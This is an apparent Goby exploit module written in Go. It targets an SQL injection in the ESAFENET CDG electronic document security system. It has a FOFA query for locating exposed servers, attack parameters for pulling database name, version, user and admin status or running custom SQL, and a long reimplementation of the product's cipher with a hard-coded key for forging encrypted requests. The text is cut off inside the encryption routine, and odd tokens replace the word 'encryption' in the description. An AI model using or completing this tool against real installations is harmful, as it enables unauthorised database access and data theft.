package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "ESAFENET-CDG /CDGServer3/CDGAuthoriseTempletService1 SQL Injection Vulnerability",
    "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion software, which uses the transparent encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.   </p><p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.</p>",
    "Product": "ESAFENET-CDG",
    "Homepage": "http://www.esafenet.com/product/277483397",
    "DisclosureDate": "2024-08-07",
    "PostTime": "2024-08-08",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "GobyQuery": "title==\"电子文档安全管理系统\" && body=\"CDGServer3\"",
    "Level": "1",
    "Impact": "<p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.</p>",
    "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default,custom,sqlpoint",
            "show": ""
        },
        {
            "name": "default",
            "type": "select",
            "value": "db_name,db_version,user_name,is_admin",
            "show": "attackType=default"
        },
        {
            "name": "custom",
            "type": "input",
            "value": "SELECT CONVERT(VARCHAR(10),111*6)",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "HW-2024",
        "SQL Injection"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.5",
    "Translation": {
        "CN": {
            "Name": "亿赛通电子文档管理系统 /CDGAuthoriseTempletService1 SQL 注入漏洞",
            "Product": "亿赛通-电子文档安全管理系统",
            "Description": "<p>亿赛通电子文档安全管理系统（简称：CDG）是一款电子文档安全加密软件，该系统利用驱动层透明加密技术，通过对电子文档的加密保护，防止内部员工泄密和外部人员非法窃取企业核心重要数据资产，对电子文档进行全生命周期防护，实现电子文档的数据安全。&nbsp;&nbsp;</p><p>亿赛通电子文档安全管理系统存在SQL注入，攻击者可通过此漏洞获取敏感信息。&nbsp;<br></p>",
            "Recommendation": "<p>1、部署Web应用防火墙，对数据库操作进行监控。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>亿赛通电子文档安全管理系统存在SQL注入，攻击者可通过此漏洞获取敏感信息。&nbsp;<br></p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "HW-2024",
                "SQL注入"
            ]
        },
        "EN": {
            "Name": "ESAFENET-CDG /CDGServer3/CDGAuthoriseTempletService1 SQL Injection Vulnerability",
            "Product": "ESAFENET-CDG",
            "Description": "<p>The electronic document security management system (hereinafter referred to as CDG) is an electronic document security encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion software, which uses the transparent encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion technology of the driver layer to prevent internal employees from leaking secrets and external personnel from illegally stealing the core important data assets of the enterprise through the encrypt_dnauncdqyd732hd7u2sj83sj8d4g6ff6ion protection of electronic documents, and protects the whole life cycle of electronic documents to achieve the data security of electronic documents.&nbsp; &nbsp;</p><p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.</p>",
            "Recommendation": "<p>1. Deploy a web application firewall to monitor database operations.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>There is SQL injection in the electronic document security management system of Esaitong, and attackers can obtain sensitive information through this vulnerability.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "HW-2024",
                "SQL Injection"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9922"
}`
	decode_cmajdcjqech78e2b83g7fg72scamicjna := func(info string) (string, error) {
		var (
			key2 = []byte{235, 144, 90, 188, 5, 44, 85, 170, 235, 144, 90, 188, 5, 44, 85, 170}
			alog = make([]int32, 256)
			log  = make([]int32, 256)
			S    = make([]byte, 256)
			Si   = make([]byte, 256)
			T1   = make([]int32, 256)
			T2   = make([]int32, 256)
			T3   = make([]int32, 256)
			T4   = make([]int32, 256)
			T5   = make([]int32, 256)
			T6   = make([]int32, 256)
			T7   = make([]int32, 256)
			T8   = make([]int32, 256)
			U1   = make([]int32, 256)
			U2   = make([]int32, 256)
			U3   = make([]int32, 256)
			U4   = make([]int32, 256)
			rcon = make([]byte, 30)
		)

		const (
			remainLow          byte = 15
			remainUp           byte = 240
			upper_bit_add_0100 byte = 64
			upper_bit_add_0101 byte = 80
		)

		var init = func() {
			var mul = func(var0, var1 int32) int32 {
				if var0 != 0 && var1 != 0 {
					return alog[(log[var0&255]+log[var1&255])%255]
				}
				return 0
			}

			var mul4 = func(var0 int32, var1 []byte) int32 {
				if var0 == 0 {
					return 0
				}
				var0 = log[var0&255]
				var var2 int32
				if var1[0] != 0 {
					var2 = alog[(var0+log[var1[0]&255])%255] & 255
				}
				var var3 int32
				if var1[1] != 0 {
					var3 = alog[(var0+log[var1[1]&255])%255] & 255
				}
				var var4 int32
				if var1[2] != 0 {
					var4 = alog[(var0+log[var1[2]&255])%255] & 255
				}
				var var5 int32
				if var1[3] != 0 {
					var5 = alog[(var0+log[var1[3]&255])%255] & 255
				}
				return var2<<24 | var3<<16 | var4<<8 | var5
			}
			alog[0] = 1
			var var2, var16 int32
			for var2 = 1; var2 < 256; var2++ {
				var16 = alog[var2-1]<<1 ^ alog[var2-1]
				if var16&256 != 0 {
					var16 ^= 283
				}
				alog[var2] = var16
			}
			for var2 = 1; var2 < 255; var2++ {
				log[alog[var2]] = var2
			}
			var4 := [8][8]byte{
				{1, 1, 1, 1, 1, 0, 0, 0},
				{0, 1, 1, 1, 1, 1, 0, 0},
				{0, 0, 1, 1, 1, 1, 1, 0},
				{0, 0, 0, 1, 1, 1, 1, 1},
				{1, 0, 0, 0, 1, 1, 1, 1},
				{1, 1, 0, 0, 0, 1, 1, 1},
				{1, 1, 1, 0, 0, 0, 1, 1},
				{1, 1, 1, 1, 0, 0, 0, 1},
			}
			var5 := [8]byte{0, 1, 1, 0, 0, 0, 1, 1}
			var7 := make([][8]byte, 256)
			var7[1][7] = 1
			var2 = 2
			var var6 int32
			for var2 < 256 {
				var16 = alog[255-log[var2]]
				var6 := 0
				for var6 < 8 {
					var7[var2][var6] = byte(var16 >> (7 - var6) & 1)
					var6++
				}
				var2++
			}
			var8 := make([][8]byte, 256)
			var2 = 0
			for var2 < 256 {
				var6 := 0
				for var6 < 8 {
					var8[var2][var6] = var5[var6]
					var16 := 0
					for var16 < 8 {
						var8[var2][var6] = byte(var8[var2][var6] ^ var4[var6][var16]*var7[var2][var16])
						var16++
					}
					var6++
				}
				var2++
			}
			var2 = 0
			for var2 < 256 {
				S[var2] = byte(var8[var2][0] << 7)
				var6 := 1
				for var6 < 8 {
					S[var2] = byte(S[var2] ^ var8[var2][var6]<<(7-var6))
					var6++
				}
				Si[S[var2]&255] = byte(var2)
				var2++
			}
			var9 := [4][4]byte{
				{2, 1, 1, 3},
				{3, 2, 1, 1},
				{1, 3, 2, 1},
				{1, 1, 3, 2},
			}
			var10 := make([][8]byte, 4)
			var2 = 0
			for var2 < 4 {
				var16 := 0
				for var16 < 4 {
					var10[var2][var16] = var9[var2][var16]
					var16++
				}
				var10[var2][var2+4] = 1
				var2++
			}
			var13 := make([][4]byte, 4)
			var2 = 0
			for var2 < 4 {
				var15 := var10[var2][var2]
				if var15 == 0 {
					var6 := var2 + 1
					for var10[var6][var2] == 0 && var6 < 4 {
						var6++
					}
					if var6 == 4 {
						panic("G matrix is not invertible")
					}
					var16 := 0
					for var16 < 8 {
						var12 := var10[var2][var16]
						var10[var2][var16] = var10[var6][var16]
						var10[var6][var16] = var12
						var16++
					}
					var15 = var10[var2][var2]
				}
				var16 = 0
				for var16 < 8 {
					if var10[var2][var16] != 0 {
						var10[var2][var16] = byte(alog[(255+log[int(var10[var2][var16])&255]-log[var15&255])%255])
					}
					var16++
				}
				var6 = 0
				for var6 < 4 {
					if var2 != var6 {
						var16 = var2 + 1
						for var16 < 8 {
							var10[var6][var16] = byte(int32(var10[var6][var16]) ^ mul(int32(var10[var2][var16]), int32(var10[var6][var2])))
							var16++
						}
						var10[var6][var2] = 0
					}
					var6++
				}
				var2++
			}
			var2 = 0
			for var2 < 4 {
				var16 = 0
				for var16 < 4 {
					var13[var2][var16] = var10[var2][var16+4]
					var16++
				}
				var2++
			}
			var6 = 0
			for var6 < 256 {
				var15 := S[var6]
				T1[var6] = mul4(int32(var15), var9[0][:])
				T2[var6] = mul4(int32(var15), var9[1][:])
				T3[var6] = mul4(int32(var15), var9[2][:])
				T4[var6] = mul4(int32(var15), var9[3][:])
				var15 = Si[var6]
				T5[var6] = mul4(int32(var15), var13[0][:])
				T6[var6] = mul4(int32(var15), var13[1][:])
				T7[var6] = mul4(int32(var15), var13[2][:])
				T8[var6] = mul4(int32(var15), var13[3][:])
				U1[var6] = mul4(var6, var13[0][:])
				U2[var6] = mul4(var6, var13[1][:])
				U3[var6] = mul4(var6, var13[2][:])
				U4[var6] = mul4(var6, var13[3][:])
				var6++
			}
			rcon[0] = 1
			var var15 int32
			var15 = 1
			var6 = 1
			for var6 < 30 {
				rcon[var6] = byte(mul(2, var15))
				var15 = int32(rcon[var6])
				var6++
			}
		}

		init()
		var getTransferUnEncrptString = func(s string) ([]byte, error) {
			abyte0 := []byte(s)
			nlength := len(abyte0)
			length := 2
			result := make([]byte, nlength/length)

			for i := 0; i < nlength; i += length {
				byteRLower := abyte0[i]
				byteLLower := abyte0[i+1]
				byteRLower &= remainLow
				byteRLower = byteRLower << 4
				byteRLower &= remainUp
				byteLLower &= remainLow
				result[i/2] = byteLLower | byteRLower
			}

			return result, nil
		}
		var getRounds = func(var0 int, var1 int) int {
			switch var0 {
			case 16:
				if var1 == 16 {
					return 10
				} else if var1 == 24 {
					return 12
				} else {
					return 14
				}
			case 24:
				if var1 != 32 {
					return 12
				} else {
					return 14
				}
			default:
				return 14
			}
		}
		var makeKey = func(var0 []byte, var1 int) ([][]int, [][]int, error) {
			if var0 == nil {
				return nil, nil, errors.New("Empty key")
			}
			if len(var0) != 16 && len(var0) != 24 && len(var0) != 32 {
				return nil, nil, errors.New("Incorrect key length")
			}
			var2 := getRounds(len(var0), var1)
			var3 := var1 / 4
			var4 := make([][]int, var2+1)
			var5 := make([][]int, var2+1)
			for i := range var4 {
				var4[i] = make([]int, var3)
				var5[i] = make([]int, var3)
			}
			var6 := (var2 + 1) * var3
			var7 := len(var0) / 4
			var8 := make([]int, var7)
			var9 := 0
			var10 := 0
			for var9 < var7 {
				tmp1 := int32(var0[var10]&255) << 24
				tmp2 := int32(var0[var10+1]&255) << 16
				tmp3 := int32(var0[var10+2]&255) << 8
				tmp4 := int32(var0[var10+3] & 255)
				var8[var9] = int(tmp1 | tmp2 | tmp3 | tmp4)
				var9++
				var10 += 4
			}
			var11 := 0
			var10 = 0
			for var10 < var7 && var11 < var6 {
				var4[var11/var3][var11%var3] = var8[var10]
				var5[var2-var11/var3][var11%var3] = var8[var10]
				var10++
				var11++
			}
			var13 := 0
			var12 := 0
			for var11 < var6 {
				var12 := var8[var7-1]
				tmp1 := (int32(S[var12>>16&255]) & 255) << 24
				tmp2 := (int32(S[var12>>8&255]) & 255) << 16
				tmp3 := (int32(S[var12&255]) & 255) << 8
				tmp4 := int32(S[var12>>24&255]) & 255

				var8[0] ^= int(tmp1) ^ int(tmp2) ^ int(tmp3) ^ int(tmp4) ^ int(int32(rcon[var13]&255)<<24)
				var13++
				if var7 != 8 {
					for var9, var10 = 1, 0; var9 < var7; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
				} else {
					for var9, var10 = 1, 0; var9 < var7/2; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
					var12 = var8[var7/2-1]
					tmp1 := int32(S[var12&255]) & 255
					tmp2 := int32(S[var12>>8&255]&255) << 8
					tmp3 := int32(S[var12>>16&255]&255) << 16
					tmp4 := int32(S[var12>>24&255]&255) << 24
					var8[var7/2] ^= int(tmp1) ^ int(tmp2) ^ int(tmp3) ^ int(tmp4)
					for var9, var10 = var7/2+1, var7/2; var9 < var7; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
				}
				for var10 = 0; var10 < var7 && var11 < var6; var11++ {
					var4[var11/var3][var11%var3] = var8[var10]
					var5[var2-var11/var3][var11%var3] = var8[var10]
					var10++
				}
			}
			for var10001 := 1; var10001 < var2; var10001++ {
				for var10 = 0; var10 < var3; var10++ {
					var12 = var5[var10001][var10]
					var5[var10001][var10] = int(U1[var12>>24&255] ^ U2[var12>>16&255] ^ U3[var12>>8&255] ^ U4[var12&255])
				}
			}
			return var4, var5, nil
		}
		var blockDecrypt = func(var0 []byte, var1 int, var3 [][]int) ([]byte, error) {
			var4 := len(var3) - 1
			var5 := var3[0]
			var6 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[0]
			var1 += 4
			var7 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[1]
			var1 += 4
			var8 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[2]
			var1 += 4
			var9 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[3]
			var1 += 4

			for var14 := 1; var14 < var4; var14++ {
				var5 = var3[var14]
				var16 := T5[var6>>24&255] ^ T6[var9>>16&255] ^ T7[var8>>8&255] ^ T8[var7&255] ^ int32(var5[0])
				var11 := T5[var7>>24&255] ^ T6[var6>>16&255] ^ T7[var9>>8&255] ^ T8[var8&255] ^ int32(var5[1])
				var12 := T5[var8>>24&255] ^ T6[var7>>16&255] ^ T7[var6>>8&255] ^ T8[var9&255] ^ int32(var5[2])
				var13 := T5[var9>>24&255] ^ T6[var8>>16&255] ^ T7[var7>>8&255] ^ T8[var6&255] ^ int32(var5[3])
				var6 = int(var16)
				var7 = int(var11)
				var8 = int(var12)
				var9 = int(var13)
			}

			var15 := make([]byte, 16)
			var5 = var3[var4]
			var16 := int32(var5[0])
			var15[0] = byte(int32(Si[var6>>24&255]) ^ (var16 >> 24))
			var15[1] = byte(int32(Si[var9>>16&255]) ^ ((var16 >> 16) & 0xFF))
			var15[2] = byte(int32(Si[var8>>8&255]) ^ ((var16 >> 8) & 0xFF))
			var15[3] = byte(int32(Si[var7&255]) ^ (var16 & 0xFF))
			var16 = int32(var5[1])
			var15[4] = byte(int32(Si[var7>>24&255]) ^ var16>>24)
			var15[5] = byte(int32(Si[var6>>16&255]) ^ var16>>16)
			var15[6] = byte(int32(Si[var9>>8&255]) ^ var16>>8)
			var15[7] = byte(int32(Si[var8&255]) ^ var16)
			var16 = int32(var5[2])
			var15[8] = byte(int32(Si[var8>>24&255]) ^ var16>>24)
			var15[9] = byte(int32(Si[var7>>16&255]) ^ var16>>16)
			var15[10] = byte(int32(Si[var6>>8&255]) ^ var16>>8)
			var15[11] = byte(int32(Si[var9&255]) ^ var16)
			var16 = int32(var5[3])
			var15[12] = byte(int32(Si[var9>>24&255]) ^ var16>>24)
			var15[13] = byte(int32(Si[var8>>16&255]) ^ var16>>16)
			var15[14] = byte(int32(Si[var7>>8&255]) ^ var16>>8)
			var15[15] = byte(int32(Si[var6&255]) ^ var16)

			return var15, nil
		}
		var decrypt = func(in []byte, result []byte, n int, var5 [][]int) error {
			abyte := make([]byte, 16)
			if n != 0 {
				for i := 0; i < n/16; i++ {
					copy(abyte, in[i*16:i*16+16])
					abyte0, err := blockDecrypt(abyte, 0, var5)
					if err != nil {
						return err
					}
					copy(result[i*16:i*16+16], abyte0)
				}
			}
			return nil
		}

		abyte1, _ := getTransferUnEncrptString(info)
		nLength := len(string(abyte1))
		groupsLen := 16 * (nLength / 16)
		_, obj2, _ := makeKey(key2, 16)
		err := decrypt(abyte1, abyte1, groupsLen, obj2)
		if err != nil {
			return "", err
		}
		if groupsLen != nLength {
			nLeft := nLength - groupsLen
			for i := 0; i < nLeft; i++ {
				n := groupsLen + i
				abyte1[n] = byte(int(abyte1[n]) ^ i)
			}
		}
		return string(abyte1), nil
	}

	encode_cmdnucwbdvcwbevyce2uyb2gcsacnuiac := func(info string) (string, error) {
		var (
			key2 = []byte{235, 144, 90, 188, 5, 44, 85, 170, 235, 144, 90, 188, 5, 44, 85, 170}
			alog = make([]int32, 256)
			log  = make([]int32, 256)
			S    = make([]byte, 256)
			Si   = make([]byte, 256)
			T1   = make([]int32, 256)
			T2   = make([]int32, 256)
			T3   = make([]int32, 256)
			T4   = make([]int32, 256)
			T5   = make([]int32, 256)
			T6   = make([]int32, 256)
			T7   = make([]int32, 256)
			T8   = make([]int32, 256)
			U1   = make([]int32, 256)
			U2   = make([]int32, 256)
			U3   = make([]int32, 256)
			U4   = make([]int32, 256)
			rcon = make([]byte, 30)
		)

		const (
			remainLow          byte = 15
			remainUp           byte = 240
			upper_bit_add_0100 byte = 64
			upper_bit_add_0101 byte = 80
		)

		var init = func() {
			var mul = func(var0, var1 int32) int32 {
				if var0 != 0 && var1 != 0 {
					return alog[(log[var0&255]+log[var1&255])%255]
				}
				return 0
			}

			var mul4 = func(var0 int32, var1 []byte) int32 {
				if var0 == 0 {
					return 0
				}
				var0 = log[var0&255]
				var var2 int32
				if var1[0] != 0 {
					var2 = alog[(var0+log[var1[0]&255])%255] & 255
				}
				var var3 int32
				if var1[1] != 0 {
					var3 = alog[(var0+log[var1[1]&255])%255] & 255
				}
				var var4 int32
				if var1[2] != 0 {
					var4 = alog[(var0+log[var1[2]&255])%255] & 255
				}
				var var5 int32
				if var1[3] != 0 {
					var5 = alog[(var0+log[var1[3]&255])%255] & 255
				}
				return var2<<24 | var3<<16 | var4<<8 | var5
			}
			alog[0] = 1
			var var2, var16 int32
			for var2 = 1; var2 < 256; var2++ {
				var16 = alog[var2-1]<<1 ^ alog[var2-1]
				if var16&256 != 0 {
					var16 ^= 283
				}
				alog[var2] = var16
			}
			for var2 = 1; var2 < 255; var2++ {
				log[alog[var2]] = var2
			}
			var4 := [8][8]byte{
				{1, 1, 1, 1, 1, 0, 0, 0},
				{0, 1, 1, 1, 1, 1, 0, 0},
				{0, 0, 1, 1, 1, 1, 1, 0},
				{0, 0, 0, 1, 1, 1, 1, 1},
				{1, 0, 0, 0, 1, 1, 1, 1},
				{1, 1, 0, 0, 0, 1, 1, 1},
				{1, 1, 1, 0, 0, 0, 1, 1},
				{1, 1, 1, 1, 0, 0, 0, 1},
			}
			var5 := [8]byte{0, 1, 1, 0, 0, 0, 1, 1}
			var7 := make([][8]byte, 256)
			var7[1][7] = 1
			var2 = 2
			var var6 int32
			for var2 < 256 {
				var16 = alog[255-log[var2]]
				var6 := 0
				for var6 < 8 {
					var7[var2][var6] = byte(var16 >> (7 - var6) & 1)
					var6++
				}
				var2++
			}
			var8 := make([][8]byte, 256)
			var2 = 0
			for var2 < 256 {
				var6 := 0
				for var6 < 8 {
					var8[var2][var6] = var5[var6]
					var16 := 0
					for var16 < 8 {
						var8[var2][var6] = byte(var8[var2][var6] ^ var4[var6][var16]*var7[var2][var16])
						var16++
					}
					var6++
				}
				var2++
			}
			var2 = 0
			for var2 < 256 {
				S[var2] = byte(var8[var2][0] << 7)
				var6 := 1
				for var6 < 8 {
					S[var2] = byte(S[var2] ^ var8[var2][var6]<<(7-var6))
					var6++
				}
				Si[S[var2]&255] = byte(var2)
				var2++
			}
			var9 := [4][4]byte{
				{2, 1, 1, 3},
				{3, 2, 1, 1},
				{1, 3, 2, 1},
				{1, 1, 3, 2},
			}
			var10 := make([][8]byte, 4)
			var2 = 0
			for var2 < 4 {
				var16 := 0
				for var16 < 4 {
					var10[var2][var16] = var9[var2][var16]
					var16++
				}
				var10[var2][var2+4] = 1
				var2++
			}
			var13 := make([][4]byte, 4)
			var2 = 0
			for var2 < 4 {
				var15 := var10[var2][var2]
				if var15 == 0 {
					var6 := var2 + 1
					for var10[var6][var2] == 0 && var6 < 4 {
						var6++
					}
					if var6 == 4 {
						panic("G matrix is not invertible")
					}
					var16 := 0
					for var16 < 8 {
						var12 := var10[var2][var16]
						var10[var2][var16] = var10[var6][var16]
						var10[var6][var16] = var12
						var16++
					}
					var15 = var10[var2][var2]
				}
				var16 = 0
				for var16 < 8 {
					if var10[var2][var16] != 0 {
						var10[var2][var16] = byte(alog[(255+log[int(var10[var2][var16])&255]-log[var15&255])%255])
					}
					var16++
				}
				var6 = 0
				for var6 < 4 {
					if var2 != var6 {
						var16 = var2 + 1
						for var16 < 8 {
							var10[var6][var16] = byte(int32(var10[var6][var16]) ^ mul(int32(var10[var2][var16]), int32(var10[var6][var2])))
							var16++
						}
						var10[var6][var2] = 0
					}
					var6++
				}
				var2++
			}
			var2 = 0
			for var2 < 4 {
				var16 = 0
				for var16 < 4 {
					var13[var2][var16] = var10[var2][var16+4]
					var16++
				}
				var2++
			}
			var6 = 0
			for var6 < 256 {
				var15 := S[var6]
				T1[var6] = mul4(int32(var15), var9[0][:])
				T2[var6] = mul4(int32(var15), var9[1][:])
				T3[var6] = mul4(int32(var15), var9[2][:])
				T4[var6] = mul4(int32(var15), var9[3][:])
				var15 = Si[var6]
				T5[var6] = mul4(int32(var15), var13[0][:])
				T6[var6] = mul4(int32(var15), var13[1][:])
				T7[var6] = mul4(int32(var15), var13[2][:])
				T8[var6] = mul4(int32(var15), var13[3][:])
				U1[var6] = mul4(var6, var13[0][:])
				U2[var6] = mul4(var6, var13[1][:])
				U3[var6] = mul4(var6, var13[2][:])
				U4[var6] = mul4(var6, var13[3][:])
				var6++
			}
			rcon[0] = 1
			var var15 int32
			var15 = 1
			var6 = 1
			for var6 < 30 {
				rcon[var6] = byte(mul(2, var15))
				var15 = int32(rcon[var6])
				var6++
			}
		}

		init()
		var getRounds = func(var0 int, var1 int) int {
			switch var0 {
			case 16:
				if var1 == 16 {
					return 10
				} else if var1 == 24 {
					return 12
				} else {
					return 14
				}
			case 24:
				if var1 != 32 {
					return 12
				} else {
					return 14
				}
			default:
				return 14
			}
		}
		var makeKey = func(var0 []byte, var1 int) ([][]int, [][]int, error) {
			if var0 == nil {
				return nil, nil, errors.New("Empty key")
			}
			if len(var0) != 16 && len(var0) != 24 && len(var0) != 32 {
				return nil, nil, errors.New("Incorrect key length")
			}
			var2 := getRounds(len(var0), var1)
			var3 := var1 / 4
			var4 := make([][]int, var2+1)
			var5 := make([][]int, var2+1)
			for i := range var4 {
				var4[i] = make([]int, var3)
				var5[i] = make([]int, var3)
			}
			var6 := (var2 + 1) * var3
			var7 := len(var0) / 4
			var8 := make([]int, var7)
			var9 := 0
			var10 := 0
			for var9 < var7 {
				tmp1 := int32(var0[var10]&255) << 24
				tmp2 := int32(var0[var10+1]&255) << 16
				tmp3 := int32(var0[var10+2]&255) << 8
				tmp4 := int32(var0[var10+3] & 255)
				var8[var9] = int(tmp1 | tmp2 | tmp3 | tmp4)
				var9++
				var10 += 4
			}
			var11 := 0
			var10 = 0
			for var10 < var7 && var11 < var6 {
				var4[var11/var3][var11%var3] = var8[var10]
				var5[var2-var11/var3][var11%var3] = var8[var10]
				var10++
				var11++
			}
			var13 := 0
			var12 := 0
			for var11 < var6 {
				var12 := var8[var7-1]
				tmp1 := (int32(S[var12>>16&255]) & 255) << 24
				tmp2 := (int32(S[var12>>8&255]) & 255) << 16
				tmp3 := (int32(S[var12&255]) & 255) << 8
				tmp4 := int32(S[var12>>24&255]) & 255

				var8[0] ^= int(tmp1) ^ int(tmp2) ^ int(tmp3) ^ int(tmp4) ^ int(int32(rcon[var13]&255)<<24)
				var13++
				if var7 != 8 {
					for var9, var10 = 1, 0; var9 < var7; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
				} else {
					for var9, var10 = 1, 0; var9 < var7/2; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
					var12 = var8[var7/2-1]
					tmp1 := int32(S[var12&255]) & 255
					tmp2 := int32(S[var12>>8&255]&255) << 8
					tmp3 := int32(S[var12>>16&255]&255) << 16
					tmp4 := int32(S[var12>>24&255]&255) << 24
					var8[var7/2] ^= int(tmp1) ^ int(tmp2) ^ int(tmp3) ^ int(tmp4)
					for var9, var10 = var7/2+1, var7/2; var9 < var7; var9++ {
						var8[var9] ^= var8[var10]
						var10++
					}
				}
				for var10 = 0; var10 < var7 && var11 < var6; var11++ {
					var4[var11/var3][var11%var3] = var8[var10]
					var5[var2-var11/var3][var11%var3] = var8[var10]
					var10++
				}
			}
			for var10001 := 1; var10001 < var2; var10001++ {
				for var10 = 0; var10 < var3; var10++ {
					var12 = var5[var10001][var10]
					var5[var10001][var10] = int(U1[var12>>24&255] ^ U2[var12>>16&255] ^ U3[var12>>8&255] ^ U4[var12&255])
				}
			}
			return var4, var5, nil
		}
		var blockEncrypt = func(var0 []byte, var1 int, var3 [][]int) ([]byte, error) {
			var4 := len(var3) - 1
			var5 := var3[0]
			var6 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[0]
			var1 += 4
			var7 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[1]
			var1 += 4
			var8 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[2]
			var1 += 4
			var9 := ((int(var0[var1]&255) << 24) | (int(var0[var1+1]&255) << 16) | (int(var0[var1+2]&255) << 8) | int(var0[var1+3]&255)) ^ var5[3]
			var1 += 4

			for var14 := 1; var14 < var4; var14++ {
				var5 = var3[var14]
				var16 := T1[var6>>24&255] ^ T2[var7>>16&255] ^ T3[var8>>8&255] ^ T4[var9&255] ^ int32(var5[0])
				var11 := T1[var7>>24&255] ^ T2[var8>>16&255] ^ T3[var9>>8&255] ^ T4[var6&255] ^ int32(var5[1])
				var12 := T1[var8>>24&255] ^ T2[var9>>16&255] ^ T3[var6>>8&255] ^ T4[var7&255] ^ int32(var5[2])
				var13 := T1[var9>>24&255] ^ T2[var6>>16&255] ^ T3[var7>>8&255] ^ T4[var8&255] ^ int32(var5[3])
				var6 = int(var16)
				var7 = int(var11)
				var8 = int(var12)
				var9 = int(var13)
			}

			var15 := make([]byte, 16)
			var5 = var3[var4]
			var16 := int32(var5[0])
			var15[0] = byte(int32(S[var6>>24&255]) ^ (var16 >> 24))
			var15[1] = byte(int32(S[var7>>16&255]) ^ (var16 >> 16))
			var15[2] = byte(int32(S[var8>>8&255]) ^ (var16 >> 8))
			var15[3] = byte(int32(S[var9&255]) ^ var16)
			var16 = int32(var5[1])
			var15[4] = byte(int32(S[var7>>24&255]) ^ (var16 >> 24))
			var15[5] = byte(int32(S[var8>>16&255]) ^ (var16 >> 16))
			var15[6] = byte(int32(S[var9>>8&255]) ^ (var16 >> 8))
			var15[7] = byte(int32(S[var6&255]) ^ var16)
			var16 = int32(var5[2])
			var15[8] = byte(int32(S[var8>>24&255]) ^ (var16 >> 24))
			var15[9] = byte(int32(S[var9>>16&255]) ^ (var16 >> 16))
			var15[10] = byte(int32(S[var6>>8&255]) ^ (var16 >> 8))
			var15[11] = byte(int32(S[var7&255]) ^ var16)
			var16 = int32(var5[3])
			var15[12] = byte(int32(S[var9>>24&255]) ^ (var16 >> 24))
			var15[13] = byte(int32(S[var6>>16&255]) ^ (var16 >> 16))
			var15[14] = byte(int32(S[var7>>8&255]) ^ (var16 >> 8))
